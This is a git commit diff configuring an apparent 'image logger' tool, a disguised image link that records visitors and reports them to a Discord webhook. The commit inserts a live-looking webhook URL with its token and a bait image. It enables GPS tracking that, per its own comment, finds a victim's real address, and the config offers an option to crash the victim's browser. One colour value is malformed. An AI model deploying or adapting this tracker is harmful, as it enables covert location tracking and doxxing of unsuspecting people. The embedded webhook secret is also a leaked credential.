9279faa0cb41b6f60127742e3f23bd0541a26a3e
Jadepogi <jadedellorenzs@gmail.com>
2025-02-19 06:50:03 +0800

    Update image.py

--- main.py
+++ main.py
@@ -12,19 +12,19 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1341541495974658180/uKBixmaDxSlBtT8ZZyJwJjw2806EFN3Hytuy1PHFAWEs_yCNsntQUl5x8k1Y5tdhJReR",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRp2FpOfcfI-kTVO7Pm1GShLbujiPWzy9xEPQ&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "prox image logger", # Set this to the name you want the webhook to have
+    "color": BA55D3, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRp2FpOfcfI-kTVO7Pm1GShLbujiPWzy9xEPQ&s" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
